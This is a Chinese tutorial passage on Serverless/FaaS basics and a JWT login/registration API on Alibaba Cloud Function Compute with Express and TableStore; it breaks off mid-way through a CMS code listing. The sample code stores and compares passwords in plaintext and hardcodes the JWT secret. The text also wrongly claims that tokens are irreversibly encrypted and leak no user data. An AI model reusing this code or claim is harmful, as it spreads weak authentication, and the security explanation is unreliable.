&#x3D; 具备 Serverless 特性的云服务\n\n\n二、编写你的第一个 Serverless 应用\n\nFaaS 平台都支持 Node.js、Python 、Java 等编程语言；\nFaaS 平台都支持 HTTP 和定时触发器（这两个触发器最常用）。此外各厂商的 FaaS 支持与自己云产品相关的触发器，函数计算支持阿里云表格存储等触发器；\nFaaS 的计费都差不多，且每个月都提供一定的免费额度。其中 GB-s 是指函数每秒消耗的内存大小，比如1G-s 的含义就是函数以 1G 内存执行 1 秒钟。超出免费额度后，费用基本都是 0.0133元&#x2F;万次，0.00003167元&#x2F;GB-s。所以，用 FaaS 整体费用非常便宜，对一个小应用来说，几乎是免费的。\n\n以阿里云函数为例\n// logic.jsexports.sayHello = function (name) &#123;  return `Hello, $&#123;name&#125;!`;&#125;// index.jsconst logic = require(&#x27;./logic&#x27;);exports.handler = (request, response, context) =&gt; &#123;  // 从 request 中获取  const &#123; name &#125; = request.queries;  // 处理业务逻辑  const message = logic.sayHello(name)  // 设置 HTTP 响应  response.setStatusCode(200);  response.setHeader(&quot;Content-Type&quot;, &quot;application/json&quot;);  response.send(JSON.stringify(&#123; message &#125;)); &#125;\n\n\n把业务逻辑拆分到入口函数之外\n\n触发器及事件对象\nHTTP 触发器\n\n\n在众多 FaaS 平台中，函数计算直接提供了 HTTP 触发器，HTTP 触发器通过发送 HTTP 请求来触发函数执行，一般都会支持 POST、GET、PUT、HEAD 等方法。所以你可以用 HTTP 触发器来构建 Restful 接口或 Web 系统。\n\n\nHTTP 触发器会根据 HTTP 请求和请求参数生成事件，然后以参数形式传递给函数。那么 HTTP 触发器的入口函数参数中的 request 和 response 参数具体有哪些属性呢？\n其实， request 和 response 参数本质上与 Express.js 框架的 request 和 response 类似\n\nAPI 网关触发器\n\nAPI 网关触发器与 HTTP 触发器类似，它主要用于构建 Web 系统。本质是利用 API 网关接收 HTTP 请求，然后再产生事件，将事件传递给 FaaS。FaaS 将函数执行完毕后将函数返回值传递给 API 网关，API 网关再将返回值包装为 HTTP 响应返回给用户。\n\n\n定时触发器\n\n\n定时触发器就是定时执行函数，它经常用来做一些周期任务，比如每天定时查询天气并给自己发送通知、每小时定时处理分析日志等等。\n\n\n日志输出无论你用什么编写语言开发 Serverless 应用，你都要在合适的时候输出合适的日志信息，方便调试应用、排查问题。在 Serverless 中，日志输出和传统应用的日志输出没有太大区别，只是日志的存储和查询方式变了。\n以函数计算为例，如果你在控制台创建函数，则函数计算默认会使用日志服务来为你存储日志。在 “日志查询” 标签下可以查看函数调用日志。日志服务是一个日志采集、分析产品，所以如果你要实现业务监控，则可以将日志输出到日志服务，然后在日志服务中对日志进行分析，并设置报警项。\n\n三、Serverless 应用是怎么运行的\nServerless 应用本质上是由一个个 FaaS 函数组成的，Serverless 应用的每一次运行，其实是单个或多个函数的运行，所以 Serverelss 的运行原理，本质上就是函数的运行原理\n\nFaaS 是怎么运行的\n\n\n函数调用链路：事件驱动函数执行\n对于 FaaS 函数来说，一方面可以通过事件来触发执行，另一方面也可以直接调用 API 来执行。FaaS 平台都提供了执行函数的 API\n\n\n函数生命周期：冷启动与热启动\nFaaS 中的冷启动是指从调用函数开始到函数实例准备完成的整个过程。冷启动我们关注的是启动时间，启动时间越短，我们对资源的利用率就越高。现在的云服务商，基于不同的语言特性，冷启动平均耗时基本在 100～700 毫秒之间。得益于 Google 的 JavaScript 引擎 Just In Time 特性，Node.js 在冷启动方面速度是最快的。\n\n\n\n注意，FaaS 服务从 0 开始，启动并执行完一个函数，只需要 100 毫秒。这也是为什么 FaaS 敢缩容到 0 的主要原因。通常我们打开一个网页有个关键指标，响应时间在 1 秒以内，都算优秀。这么一对比，100 毫秒的启动时间，对于网页的秒开率影响真的极小\n\n\n在 FaaS 平台中，函数默认是不运行的，也不会分配任何资源。甚至 FaaS 中都不会保存函数代码。只有当 FaaS 接收到触发器的事件后，才会启动并运行函数。整个函数的运行过程可以分为四个阶段\n\n\n\n下载代码： FaaS 平台本身不会存储代码，而是将代码放在对象存储中，需要执行函数的时候，再从对象存储中将函数代码下载下来并解压，因此 FaaS 平台一般都会对代码包的大小进行限制，通常代码包不能超过 50MB。\n启动容器： 代码下载完成后，FaaS 会根据函数的配置，启动对应容器，FaaS 使用容器进行资源隔离。\n初始化运行环境： 分析代码依赖、执行用户初始化逻辑、初始化入口函数之外的代码等。\n运行代码： 调用入口函数执行代码。\n\n\n当函数第一次执行时，会经过完整的四个步骤，前三个过程统称为“冷启动”，最后一步称为 “热启动”。\n\n整个冷启动流程耗时可能达到百毫秒级别。函数运行完毕后，运行环境会保留一段时间，可能 2 ~ 5 分钟，这和具体云厂商有关。如果这段时间内函数需要再次执行，则 FaaS 平台就会使用上一次的运行环境，这就是“执行上下文重用”，函数的这个启动过程也叫“热启动”。“热启动” 的耗时就完全是启动函数的耗时了。当一段时间内没有请求时，函数运行环境就会被释放，直到下一次事件到来，再重新从冷启动开始初始化。\n下面是一个函数的请求示意图，其中 “请求1” “请求3” 是冷启动，“请求2” 是热启动\n\n\n函数执行完毕后销毁运行环境，虽然对首次函数执行的性能有损耗，但极大提高了资源利用效率，只有需要执行代码的时候才初始化环境、消耗硬件资源。并且如果你的应用请求量比较大，则大部分时候函数的执行可能都是热启动\n\nFaaS 是怎么分层的\n\n你的 FaaS 实例执行时，就如上图所示，至少是 3 层结构：容器、运行时 Runtime、具体函数代码。\n\n容器你可以理解为操作系统 OS。代码要运行，总需要和硬件打交道，容器就是模拟出内核和硬件信息，让你的代码和 Runtime 可以在里面运行。容器的信息包括内存大小、OS 版本、CPU 信息、环境变量等等。目前的 FaaS 实现方案中，容器方案可能是 Docker 容器、VM 虚拟机，甚至 Sandbox 沙盒环境。运行时 Runtime，就是你的函数执行时的上下文 context。Runtime 的信息包括代码运行的语言和版本，例如 Node.js v10，Python3.6；可调用对象，例如 aliyun SDK；系统信息，例如环境变量等等。\n\n\n这样分层有什么好处呢？容器层适用性更广，云服务商可以预热大量的容器实例，将物理服务器的计算资源碎片化。Runtime 的实例适用性较低，可以少量预热；容器和 Runtime 固定后，下载你的代码就可以执行了。通过分层，我们可以做到资源统筹优化，这样就能让你的代码快速低成本地被执行。\n理解了分层，我们再回想一下 FaaS 分层对应冷启动的过程，其实你就不难理解云服务商负责的就是容器和 Runtime 的准备阶段了。而开发者自己负责的则是函数执行阶段。一旦容器 &amp;Runtime 启动后，就会维持一段时间，这段时间内的这个函数实例就可以直接处理用户数据请求。当一段时间内没有用户请求事件发生（各个云服务商维持实例的时间和策略不同），则会销毁这个函数实例。\n\n\n\n\n纯 FaaS 应用调用链路由函数触发器、函数服务和函数代码三部分组成，它们分别替代了传统服务端运维的负载均衡 &amp; 反向代理，服务器 &amp; 应用运行环境，应用代码部署\n对比传统应用托管 PaaS 平台，FaaS 应用最大的不同就是，FaaS 应用可以缩容到 0，在事件到来时极速启动，Node.js 的函数甚至可以做到 100ms 启动并执行。\nFaaS 在设计上牺牲了用户的可控性和应用场景，来简化代码模型，并且通过分层结构进一步提升资源的利用率，这也是为什么 FaaS 冷启动时间能这么短的主要原因。关于 FaaS 的 3 层结构，你可以这么想象：容器层就像是 Windows 操作系统；Runtime 就像是 Windows 里面的播放器暴风影音；你的代码就像是放在 U 盘里的电影\n\n总结\n组成 Serverless 应用的函数是事件驱动的，但你也可以直接同 API 调用函数；\n函数可以同步调用或异步调用，定时触发器函数是异步调用的，异步调用函数建议主动记录并处理异步调用结果；\n函数的启动过程分为下载代码、启动容器、启动运行环境、执行代码四个步骤，前三个步骤称为冷启动，最后一个步骤称为热启动\n\n四、如何提高应用开发调试和部署效率应用管理\nServerless 应用是由函数组成的，所以应用的管理主要就是函数的管理。各个 FaaS 平台其实也考虑到了这一点，比如函数计算的 “服务”功能或 Lambda 的 “应用” 功能。你可以把一个应用的函数都创建在同一个 “服务” 下，一个 “服务” 即代表一个应用。\n\n\n\n那么如何去描述 “服务” 和 “函数” 的关系呢？因为二者是静态的，不会在代码运行时改变，所以你可以用 YAML 或 JSON 配置文件来表示（我推荐 YAML，因为它可以编写注释，可读性更好）。在创建函数时，你还要指定函数的入口、编程语言、触发器等信息。所以 YAML 文件的内容可能是这样的：\n\n# serverless.yaml# 应用名称service: myservice# 函数列表functions:    # 函数1  hello:    handler: hello.main # 函数入口    runtime: nodejs12    events: # 函数触发器，一个函数可能有多个触发器        - http        - timer  # 函数2  goodbye:    handler: goodbye.main    runtime: nodejs12    events:        - http\n\n应用开发有了应用配置文件之后，开发者就可以开始开发代码了。为了进一步简化用户操作，你甚至可以提供一些代码模板，然后提供 init 命令让开发者基于模板一键生成一个 Serverless 应用。例如\n$ serverless init --template hello-world|-- hello.js|-- serverless.yaml# serverless.yamlservice: myservicefunctions:  hello:    handler: hello.main    events:        - http\n\n五、serverless应用阿里云函数计算\nhttps://fc.console.aliyun.com/fc/overview\n\n选择一个模板，体验一下\n\n\n云函数使用指南 https://help.aliyun.com/product/50980.html\n\n腾讯云函数\n\n云函数使用指南 https://cloud.tencent.com/document/product/876/41762\n\n使用vercel部署你的应用-推荐vercel是用过的最好用的网站托管服务，我们可以在上面部署api、静态页面等。可以和GitHub深度绑定，推送代码，vercel会帮我们检测自动部署\n新建项目\n\n导入GitHub的某一个项目部署\n\n\n\n\n\n部署完成后，可以在控制面板看到，vercel每次部署都动态帮我生成一个地址，可以直接访问你的应用\n\n\n绑定GitHub应用\n\n\n每次提交代码到GitHub，vercel都会自动帮我们构建发布\n\n\n绑定域名\n我们可以绑定自己的自定义域名\n\n\n我们还可以使用vercel部署node小型应用，非常的方便。更多参考文档 https://vercel.com/docs\n\n六、场景案例1 使用 Serverless 实现登录注册功能1.1 身份认证的技术方案Cookie-Session\n\nCookie-Session 方式是早期最常用的身份认证方式，直到现在很多 Web 网站依然使用这种方式。其认证流程是\n\n\n用户在浏览器中输入账号密码登录；\n服务端验证通过后，将用户信息保存在 Session 中并生成一个 Session ID；\n然后服务端将 Session ID 放在 HTTP 响应头的 cookie 字段中；\n浏览器收到 HTTP 响应后，将 cookie 保存在浏览器中，cookie 内容就是之前登录时生成的 Session ID；\n用户再访问网站时，浏览器请求头就会自动带上 cookie 信息；\n服务端接收到请求后，从 cookie 获取到 Session ID，然后根据 Session ID 解析出用户信息。\n\n\n这种方案存在两个主要问题：\n\n服务端的 Session ID 是直接存储在内存中的，在分布式系统中无法共享登录状态；\ncookie 是浏览器的功能，手机 App 等客户端并不支持 cookie，所以该方案不适用于非浏览器的应用。\n\n第一个问题也是 Cookie-Session 方案应用于 Serverless 架构的主要问题，因为 Serverless 应用是无状态的，内存中的数据用完即销毁，多个请求间无法共享 Session。解决该问题也比较容易， 就是用一个共享存储来保存 Session 信息，最常见的就是 Redis，因为 Redis 是一个内存数据库，读写速度很快。\n\n于是 Cookie-Session 的身份认证方案就发生了变化：\n\n\n\n与早期方案不同，用户登录时，该方案会把用户信息保存在 Redis 中，而不是内存中，然后服务端依然会将 Session ID 返回给浏览器，浏览器将其保存在 cookie 中。而之后非登录的请求，浏览器依然会将包含 Session ID 的 cookie 放在请求头中发送给服务端，服务端拿到 Session ID 后，从 Redis 中查询出用户信息。这样就可以解决分布式、无状态的系统中用户登录状态共享问题。\n\n不过这个方案依旧无法解决非浏览器场景的身份认证问题，所以 JWT 方案诞生了。\nJWT\n\nJWT 是（JSON Web Token）的简称，其原理是：\n\n\n服务端认证通过后，根据用户信息生成一个 token 返回给客户端；\n客户端将 token 存储在 cookie 或 localStorage 中；\n之后客户端每次请求都需要带上 token，通常是将 token 放在 HTTP 请求头的 Authorization 字段中；\n服务端接收到 token 后，验证 token 的合法性，并从 token 中解析出用户信息。\n\n\n\ntoken 是个比较长字符串，格式为 Header.Payload.Signature，由.分隔为三部分。下面是一个实际的 token 示例：\n\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJqYWNrIiwiaWF0IjoxNjEwODg1MTcxfQ.KIduc-undaZ0z-Bt4wjGZIK5fMlx1auVHl_G1DvGDCw\n\n可能有同学会担忧： token 是根据用户信息生成的，这样会不会泄露用户信息呢？其实不用担心，因为生成 token 的加密算法是不可逆的，并且 token 也可以设置过期时间，所以 token 字符串本身不会泄露用户信息。\n\n基于 JWT ，客户端可以使用自己特有的存储来保存 token，不依赖 cookie，所以 JWT 可以适用于任意客户端。并且使用 JWT 进行身份认证，服务端就不用存储用户信息了，这样服务端就是无状态的。因此 JWT 这种身份认证方案，也非常适合 Serverless 应用。\n\n接下来，就基于 JWT ，带你从 0 到 1实现一个登录注册应用\n1.2 从 0 到 1 实现一个登录注册应用应用初始化\n\n首先安装 express、body-parser 和 @webserverless/fc-express 等依赖：\n\n$ npm i express body-parser @webserverless/fc-express -S\n\n\n@webserverless&#x2F;fc-express 的作用是将函数计算的 HTTP 或 API 网关触发器参数转换为 Express.js 框架的参数，这样你就可以很方便在函数计算中使用 Express.js 了\n\n然后我们初始化一个 template.yaml 模板，该模板定义了 auth-app 这个函数，函数触发器为 HTTP 触发器，支持 GET 和 POST 请求：\nROSTemplateFormatVersion: &#x27;2015-09-01&#x27;Transform: &#x27;Aliyun::Serverless-2018-04-03&#x27;Resources:  serverless:    Type: &#x27;Aliyun::Serverless::Service&#x27;    Properties:      Description: &#x27;Serverless Authorization App&#x27;    auth-app:      Type: &#x27;Aliyun::Serverless::Function&#x27;      Properties:        Handler: index.handler        Runtime: nodejs12        CodeUri: &#x27;./&#x27;        Timeout: 10      Events:        httpTrigger:          Type: HTTP          Properties:            AuthType: ANONYMOUS            Methods: [&#x27;POST&#x27;, &#x27;GET&#x27;]\n\n接下来在 index.js 中编写初始化代码，如下所示：\nconst proxy = require(&#x27;@webserverless/fc-express&#x27;)const express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const app = express();app.use(bodyParser.urlencoded(&#123;  extended: true&#125;));// 定义 / 路由，返回 Hello Serverless!app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;    res.json(&#123;        success: true,        data: &#x27;Hello Serverless!&#x27;,    &#125;);&#125;);const server = new proxy.Server(app);module.exports.handler = function (req, res, context) &#123;    // 使用 @webserverless/fc-express 来将函数计算的请求转发给 Express.js 应用    // @webserverless/fc-express 可以将函数参数转换为 Express.js 的路由参数    server.httpProxy(req, res, context);&#125;;\n\n这段代码主要实现两个功能：\n\n定义了 / 路由，该路由返回了 Hello Serverless! 字符串，我们之后可以用它来测试代码是否正常运行；\n使用 @webserverless/fc-express 将函数计算的请求转发给 Express.js 应用@webserverless/fc-express 可以将函数参数转换为Express.js&#96; 的路由参数。\n\n然后通过 fun deploy 部署应用：\n# 部署应用$ fun deploy -yWaiting for service serverless to be deployed...        Waiting for function auth-app to be deployed...                Waiting for packaging function auth-app code...                The function auth-app has been packaged. A total of 419 files were compressed and the final size was 724.49 KB                Waiting for HTTP trigger httpTrigger to be deployed...                triggerName: httpTrigger                methods: [ &#x27;POST&#x27;, &#x27;GET&#x27; ]                url: https://1457216987974698.cn-shanghai.fc.aliyuncs.com/2016-08-15/proxy/serverless/auth-app/                trigger httpTrigger deploy success        function auth-app deploy successservice serverless deploy success$ curl https://1457216987974698.cn-shanghai.fc.aliyuncs.com/2016-08-15/proxy/serverless/auth-app/&#123;&quot;success&quot;:true,&quot;data&quot;:&quot;Hello Serverless!&quot;&#125;\n\n\n部署成功后，我们就可以获取到函数计算提供的测试 HTTP Endpoint，然后就可以通过 curl 命令进行测试应用是否正常运行：\n\n$ curl https://1457216987974698.cn-shanghai.fc.aliyuncs.com/2016-08-15/proxy/serverless/auth-app/&#123;&quot;success&quot;:true,&quot;data&quot;:&quot;Hello Serverless!&quot;&#125;\n\n1.3 实现注册功能\n注册的逻辑是：先获取用户输入的用户名和密码，然后判断用户是否存在，如果不存在就将其存入表格存储数据库\n\n这里我们使用的数据库是表格存储。 可能你使用的比较多的是 MySQL，之所以选用表格存储而不是 MySQL，是因为表格存储可以直接通过 Restful API 进行读写，并且弹性可扩展，更适合 Serverless 应用。使用表格存储时，你要先创建一个表格存储实例，然后创建一个 user 表。为了方便，我也给你提供了一个创建 user 表的脚本：create-table。\n\n接下来继续编写代码。由于要使用表格存储，所以首先需要安装 tablestore 依赖，然后在 index.js 中初始化表格存储 client：\n\n# 安装 tablestore 依赖# tablestore 封装了表格存储的 API$ npm i tablestore -S// index.js// ...const TableStore = require(&#x27;tablestore&#x27;);// 初始化 TableStore clientconst client = new TableStore.Client(&#123;  accessKeyId: &#x27;&lt;your access key&gt;&#x27;,  accessKeySecret: &#x27;your access secret&#x27;,  endpoint: &#x27;https://serverless-app.cn-shanghai.ots.aliyuncs.com&#x27;,  instancename: &#x27;serverless-app&#x27;,&#125;);\n\n\n现在我们就可以定义一个路由来处理用户的注册请求了。代码如下所示，首先我们根据 name 从表格存储中查询用户信息，如果用户已存在，则直接返回；如果用户不存在，则将用户信息写入表格存储。\n\n// 定义 /register 路由，处理注册请求app.post(&#x27;/register&#x27;, async (req, res) =&gt; &#123;  // 从请求体中获取用户信息  const name = req.body.name;  const password = req.body.password;  const age = req.body.age;  // 判断用户是否已经存在  const &#123; row &#125; = await client.getRow(&#123;    tableName: &quot;user&quot;,    primaryKey: [&#123;      name    &#125;]  &#125;);  if (row.primaryKey) &#123;    // 如果用户已存在，则直接返回    return res.json(&#123;      success: false,      message: &#x27;用户已存在&#x27;    &#125;);  &#125;  // 创建用户，将用户信息写入到表格存储中  await client.putRow(&#123;    tableName: &quot;user&quot;,    condition: new TableStore.Condition(TableStore.RowExistenceExpectation.EXPECT_NOT_EXIST, null),    primaryKey: [&#123;      name    &#125;],    attributeColumns: [&#123;      password    &#125;, &#123;      age    &#125;]  &#125;);  // 返回创建成功  return res.send(&#123;    success: true,  &#125;);&#125;);\n\n\n至此注册功能就完成了，你可以将代码部署到函数计算上，像下面这样通过 curl 命令来模拟用户请求，验证功能是否正常：\n\n$ curl https://1457216987974698.cn-shanghai.fc.aliyuncs.com/2016-08-15/proxy/serverless/auth/login \\-d &quot;name=jack&amp;password=123456&amp;age=18&quot; \\-X POST&#123;&quot;success&quot;:true&#125;$ curl https://1457216987974698.cn-shanghai.fc.aliyuncs.com/2016-08-15/proxy/serverless/auth/login \\-d &quot;name=jack&amp;password=123456&amp;age=18&quot; \\-X POST&#123;&quot;success&quot;:false,&quot;message&quot;:&quot;用户已存在&quot;&#125;\n\n注册功能完成后，就可以继续实现登录功能了。\n1.4 实现登录功能登录就是验证用户输入的用户名密码是否正确。\n\n首先根据用户输入的 name 从表格存储中查询出用户信息，然后对比用户密码与数据库中的用户密码是否一致，如果一致，则登录成功；否则登录失败。登录成功后，还需要根据用户信息生成一个 token 返回给用户。具体怎么实现呢？\n\n前面我们提到，Serverless 中最通用的身份认证方案是 JWT，所以我们首先需要安装 Node.js 中的 JWT 依赖包 jsonwebtoken：\n$ npm install jsonwebtoken -S\n\n\n然后在代码中引入 jsonwebtoken ，并定义 SECRET。SECRET 是用来加密和解密 token 的密钥，非常重要，且不能泄露。\n\n\n接下来在代码中定义 /login 路由来处理用户请求。这段代码中，我们首先验证了用户密码是否正确，密码正确后，再使用 jwt.sign() 方法，根据用户信息生成了 token，最后将 token 返回给客户端，客户端需要将 token 保存下来。之后客户端每次请求，都需要带上 token 进行身份认证。\n\n// index.js// ...const jwt = require(&#x27;jsonwebtoken&#x27;)// 设置密钥，非常重要，不能泄露const SECRET = &#x27;token_secret_xd2dasf19df=&#x27;// ...// 定义 /login 路由，用来实现登录功能app.post(&#x27;/login&#x27;, async (req, res) =&gt; &#123;  // 从请求体中获取用户名和密码  const name = req.body.name;  const password = req.body.password;  // 根据用户名查询用户信息  const &#123;    row  &#125; = await client.getRow(&#123;    tableName: &#x27;user&#x27;,    primaryKey: [&#123;      name    &#125;]  &#125;)  // 如果查询结果为空，则直接返回用户不存在  if (!row.primaryKey) &#123;    return res.json(&#123;      success: false,      message: &#x27;用户不存在&#x27;    &#125;)  &#125;  // 从查询结果中构造用户信息  const user = &#123;    name  &#125;;  row.attributes.forEach(item =&gt; user[item.columnName] = item.columnValue);  // 判断密码是否正确  if (password !== user.password) &#123;    return res.json(&#123;      success: false,      message: &#x27;密码错误&#x27;    &#125;)  &#125;  user.password = &#x27;******&#x27;;  /**   * 生成 token   * jwt.sign() 接受两个参数，一个是传入的对象，一个是自定义的密钥   */  const token = jwt.sign(user, SECRET)  return res.json(&#123;    success: true,    data: &#123; token &#125;  &#125;)&#125;);\n\n代码编写完成后，部署到函数计算并进行测试，如下所示：\ncurl https://1457216987974698.cn-shanghai.fc.aliyuncs.com/2016-08-15/proxy/serverless/auth-app/login \\-d &quot;name=jack&amp;password=123456&quot; \\ -X POST&#123;&quot;success&quot;:true,&quot;data&quot;:&#123;&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiamFjayIsImFnZSI6IjE4IiwicGFzc3dvcmQiOiIqKioqKioiLCJpYXQiOjE2MTA5MDY5MTJ9.qzNZarWbpDUA8-SO6nLd4ffEUR1IVOWKGXiocHV7MkU&quot;&#125;&#125;# 使用错误的密码登录$ curl https://1457216987974698.cn-shanghai.fc.aliyuncs.com/2016-08-15/proxy/serverless/auth-app/login \\-d &quot;name=jack&amp;password=1234561&quot; \\-X POST&#123;&quot;success&quot;:false,&quot;message&quot;:&quot;密码错误&quot;&#125;\n\n\n那么问题来了：对于需要登录后才能访问的接口，应该怎么根据 token 验证用户身份呢？别急，我们继续下面的学习。\n\n1.5 验证用户身份\n前面提到，登录成功后，客户端需要将 token 保存下来，然后在接下来的请求中，都需要带上 token。通常会将 token 放在 HTTP 请求头中，格式通常为：\n\nAuthorization: Bearer token\n\n这时假设我们要实现一个新的接口，获取当前登录用户信息，该接口也只能登录后才能使用。那么代码实现就是下面这样：\n// 定义 /user 路由，获取当前登录的用户信息app.get(&#x27;/user&#x27;, (req, res) =&gt; &#123;  // 从 HTTP 请求头中获取 token 信息  const token = req    .headers    .authorization    .split(&#x27; &#x27;)    .pop();  try &#123;    // 验证 token 并解析出用户信息    const user = jwt.verify(token, SECRET);    return res.json(&#123;      success: true,      data: user    &#125;)  &#125; catch (error) &#123;    return res.json(&#123;      success: false,      data: &#x27;身份认证失败&#x27;    &#125;)  &#125;&#125;);\n\n\n首先我们定义了 &#x2F;user 路由，然后通过请求头拿到 token 信息，最后使用 jwt.verify() 对 token 进行解密，并从中得到用户信息，如果用户传入的 token 无法解析，则说明用户身份异常。\n\n同样，我们可以将代码部署到函数计算并进行测试：\ncurl https://1457216987974698.cn-shanghai.fc.aliyuncs.com/2016-08-15/proxy/serverless/auth-app/user \\-H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiamFjayIsImFnZSI6IjE4IiwicGFzc3dvcmQiOiIqKioqKioiLCJpYXQiOjE2MTA5MDY5MTJ9.qzNZarWbpDUA8-SO6nLd4ffEUR1IVOWKGXiocHV7MkU&quot;&#123;&quot;success&quot;:true,&quot;data&quot;:&#123;&quot;name&quot;:&quot;jack&quot;,&quot;age&quot;:&quot;18&quot;,&quot;password&quot;:&quot;******&quot;,&quot;iat&quot;:1610905944&#125;&#125;# 使用错误的 token 进行身份认证$ curl https://1457216987974698.cn-shanghai.fc.aliyuncs.com/2016-08-15/proxy/serverless/auth-app/user -H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiamFjayIsImFnZSI6IjE4IiwicGFzc3dvcmQiOiIqKioqKioiLCJpYXQiOjE2MTA5MDY5MTJ9.qzNZarWbpDUA8-SO6nLd4ffEUR1IVOWKGXiocHV7Mk&quot;&#123;&quot;success&quot;:false,&quot;data&quot;:&quot;身份认证失败&quot;&#125;\n\n\n到此为止，一个 Serverless 架构的登录注册功能就完成了，我们也基于 JWT 实现了 Serverless 中的身份认证。\n\n强调这样几点：\n\nCookie-Session 的身份认证方式，是在服务端存储 Session 信息，客户端（浏览器）通过 cookie 存储 Session ID；\nJWT 的身份认证方式，是在服务端根据用户信息生成 token，客户端保存 token；\nCookie-Session 的认证方案通常是有状态的，对于分布式、无状态的应用，需要将 Session 保存在共享存储中；\nJWT 的认证方式通常是无状态的，所以比较适合 Serverless 应用。\n\n2 基于 Serveless 构建弹性可扩展的 Restful API\nAPI 是使用 Serverless 最常见，也是最适合的场景之一。和 Serverful 架构的 API 相比，用 Serverless 开发 API 好处很多：\n\n\n不用购买、管理服务器等基础设施，不用关心服务器的运维，节省人力成本；\n基于 Serverless 的 API，具备自动弹性伸缩的能力，能根据请求流量弹性扩缩容，让你不再担心流量波峰、波谷；\n基于 Serverless 的 API 按实际资源使用量来付费，节省财务成本。\n\n\n因为好处很多，很多开发者跃跃欲试，但在实践过程中却遇到了很多问题，比如怎么设计最优的架构？怎么组织代码？怎么管理多个函数？所以今天我就以开发一个内容管理系统为例，带你学习怎么基于 Serverless 去开发一个 Restful API，解决上述共性问题。\n\n首先，我们需要对内容管理系统进行架构设计。\n2.1 内容管理系统的架构设计在进行架构设计前，你要明确系统的需求。对于一个内容管理系统，最核心的功能（也是这一讲要实现的功能），主要有这样几个：\n\n用户注册；\n用户登录；\n发布文章；\n修改文章；\n删除文章；\n查询文章。\n\n\n这 6 个功能分别对应了我们要实现的 Restful API。为了方便统一管理 API，在 Serverless 架构中我们通常会用到 API 网关，通过 API 网关触发函数执行，并且基于 API 网关我们还可以实现参数控制、超时时间、IP 黑名单、流量控制等高级功能。\n\n对于文章管理相关的 Restful API，用户发布文章前需要先登录，你已经知道在 Serverless 中可以用 JWT 进行身份认证，咱们的管理系统中的登录注册功能也将沿用上一讲的内容。\n\n在传统的 Serverful 架构中，通常会用 MySQL 等关系型数据库存储数据，但因为关系型数据库要在代码中维护连接状态及连接池，且一般不能自动扩容，并不适合 Serverless 应用，所以在 Serverless 架构中，通常选用表格存储等 Serverless NoSQL 数据来存储数据。\n\n基于 JWT 的身份认证方案、数据存储方案，我们可以画出 Serverless 的内容管理系统架构图：\n\n\n图中主要表达的意思是： 通过 API 网关承接用户请求，并驱动函数执行。每个函数分别实现一个具体功能，并通过 JWT 实现身份认证，最后表格存储作为数据库。\n其中，数据库中存储的数据主要是用户数据和文章数据。假设用户有 username（用户名） 和 password（密码） 两个属性；文章有 article_id（文章 ID）、username（创建者）、title（文章标题）、content（文章内容）、create_date（创建时间）、update_date（更新时间）这几个属性\n\n\n接下来，你可以在表格存储中创建对应的数据表（你可以在表格存储控制台创建，也可以直接用我提供的这段代码进行创建）：\n// index.jsconst TableStore = require(&quot;tablestore&quot;);// 初始化 TableStore clientconst client = new TableStore.Client(&#123;  accessKeyId: &#x27;&lt;your access key&gt;&#x27;,  accessKeySecret: &#x27;&lt;your access secret&gt;&#x27;,  endpoint: &quot;https://serverless-app.cn-shanghai.ots.aliyuncs.com&quot;,  instancename: &quot;serverless-cms&quot;,&#125;);/** * 创建 user 表 * * 参考文档： https://help.aliyun.com/document_detail/100594.html */async function createUserTable() &#123;  const table = &#123;    tableMeta: &#123;      tableName: &quot;user&quot;,      primaryKey: [        &#123;          name: &quot;username&quot;, // 用户名          type: TableStore.PrimaryKeyType.STRING,        &#125;,      ],      definedColumn: [        &#123;          name: &quot;password&quot;, // 密码          type: TableStore.DefinedColumnType.DCT_STRING,        &#125;,      ],    &#125;,    // 为数据表配置预留读吞吐量或预留写吞吐量。0 表示不预留吞吐量，完全按量付费    reservedThroughput: &#123;      capacityUnit: &#123;        read: 0,        write: 0,      &#125;,    &#125;,    tableOptions: &#123;      // 数据的过期时间，单位为秒，-1表示永不过期      timeToLive: -1,      // 保存的最大版本数，1 表示每列上最多保存一个版本即保存最新的版本      maxVersions: 1,    &#125;,  &#125;;  await client.createTable(table);&#125;/** * 创建文章表 */async function createArticleTable() &#123;  const table = &#123;    tableMeta: &#123;      tableName: &quot;article&quot;,      primaryKey: [        &#123;          name: &quot;article_id&quot;, // 文章 ID，唯一字符串          type: TableStore.PrimaryKeyType.STRING,        &#125;,      ],      definedColumn: [        &#123;          name: &quot;title&quot;,          type: TableStore.DefinedColumnType.DCT_STRING,        &#125;,        &#123;          name: &quot;username&quot;,          type: TableStore.DefinedColumnType.DCT_STRING,        &#125;,        &#123;          name: &quot;content&quot;,          type: TableStore.DefinedColumnType.DCT_STRING,        &#125;,        &#123;          name: &quot;create_date&quot;,          type: TableStore.DefinedColumnType.DCT_STRING,        &#125;,        &#123;          name: &quot;update_date&quot;,          type: TableStore.DefinedColumnType.DCT_STRING,        &#125;,      ],    &#125;,    // 为数据表配置预留读吞吐量或预留写吞吐量。0 表示不预留吞吐量，完全按量付费    reservedThroughput: &#123;      capacityUnit: &#123;        read: 0,        write: 0,      &#125;,    &#125;,    tableOptions: &#123;      // 数据的过期时间，单位为秒，-1表示永不过期      timeToLive: -1,      // 保存的最大版本数，1 表示每列上最多保存一个版本即保存最新的版本      maxVersions: 1,    &#125;,  &#125;;  await client.createTable(table);&#125;(async function () &#123;    await createUserTable();  await createArticleTable();&#125;)();\n\n\n这段代码主要创建了 user 和 article 两张表，其中 user 表的主键是 username，article 表的主键是 article_id，主键的作用是方便查询。除了主键，我还定义了几个列。其实对于表格存储，默认也可以不创建列，表格存储是宽表，除主键外，数据列可以随意扩展\n\n在完成了数据库表的创建后，我们就可以开始进行系统实现了。\n2.2 内容管理系统的实现为了方便你学习，为你提供了完整代码（代码地址），你可以参考着学习。\n$ git clone https://github.com/poetries/serverless-class$ cd 15/cms\n\n整个代码目录结构如下：\n.├── package.json├── src│   ├── config│   │   └── index.js│   ├── db│   │   └── client.js│   ├── function│   │   ├── article│   │   │   ├── create.js│   │   │   ├── delete.js│   │   │   ├── detail.js│   │   │   └── update.js│   │   └── 